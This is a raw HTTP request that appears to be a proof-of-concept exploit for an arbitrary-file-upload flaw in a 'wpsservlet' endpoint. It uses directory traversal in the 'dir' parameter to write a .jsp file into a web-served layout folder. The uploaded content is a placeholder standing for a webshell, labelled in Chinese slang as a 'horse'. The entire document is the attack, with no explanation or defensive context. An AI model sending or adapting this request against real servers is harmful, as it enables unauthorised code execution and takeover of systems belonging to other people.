POST http://target.com/defaultroot/wpsservlet?option=saveNewFile&newdocId=test&dir=../platform/portal/layout/&fileType=.jsp HTTP/1.1 
Host: target.com 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)  
Content-Length: 266 
Cache-Control: max-age=0 
Content-Type: multipart/form-data; boundary=803e058d60f347f7b3c17fa95228eca6
Accept-Encoding: gzip, deflate
Connection: close  

--803e058d60f347f7b3c17fa95228eca6 Content-Disposition: form-data; name="NewFile"; filename="test.jsp"  
<% jsp 马儿 %>
 --803e058d60f347f7b3c17fa95228eca6--